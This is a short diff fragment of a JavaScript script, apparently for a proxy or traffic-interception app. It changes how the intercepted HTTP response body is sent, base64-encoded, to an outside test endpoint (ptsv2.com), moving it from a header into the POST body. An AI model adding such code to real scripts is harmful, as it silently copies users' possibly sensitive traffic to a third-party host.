@@ -26,10 +26,7 @@ var body = $response.body;
 console.log("start upload");
 const testServer = {
     url: 'https://ptsv2.com/t/5y3is-1625470771/post',
-    headers:{
-        'info': btoa(body)
-    },
-    body: "1234"
+    body: btoa(body)
   };
   $req.post(testServer, function(error, response, data) {
     if (!error) {
